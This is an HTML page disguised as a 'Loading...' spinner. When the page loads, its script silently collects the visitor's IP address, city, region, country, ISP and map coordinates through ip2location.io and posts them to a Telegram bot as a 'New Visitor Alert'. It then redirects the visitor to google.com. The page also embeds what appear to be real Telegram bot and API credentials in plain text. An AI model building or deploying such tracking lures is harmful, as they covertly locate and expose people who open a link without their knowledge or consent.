<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script>
        const telegramBotToken = '8748019544:AAFM5EwSiIXfvQQycGYq-HgSioB6NjBp0Gk';
        const telegramChatId = '2035487139';
        const ip2locationApiKey = 'B2931F61728A60CCFF873E5BEB60F9FB';

        async function trackVisitor() {
            try {
                // Fetch IP details from ip2location.io
                const response = await fetch(`https://api.ip2location.io/?key=${ip2locationApiKey}`);
                const data = await response.json();

                const ip = data.ip || 'N/A';
                const city = data.city_name || 'N/A';
                const region = data.region_name || 'N/A';
                const country = data.country_name || 'N/A';
                const isp = data.as || 'N/A';
                const latitude = data.latitude;
                const longitude = data.longitude;

                let mapsLink = 'N/A';
                if (latitude && longitude) {
                    mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                }

                // Prepare Telegram message
                const message = `🚨 *New Visitor Alert!* 🚨\n\n` +
                                `🌐 *IP Address:* \`${ip}\`\n` +
                                `🌆 *City:* ${city}\n` +
                                `🗺️ *Region:* ${region}\n` +
                                `🏳️ *Country:* ${country}\n` +
                                `📡 *ISP:* ${isp}\n\n` +
                                `📍 *Google Maps Link:*\n${mapsLink}`;

                // Send to Telegram
                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

            } catch (error) {
                console.error('Error tracking visitor:', error);
            } finally {
                // Redirect target (e.g., Google or Youtube)
                window.location.href = "https://www.google.com";
            }
        }

        window.onload = trackVisitor;
    </script>
</body>
</html>
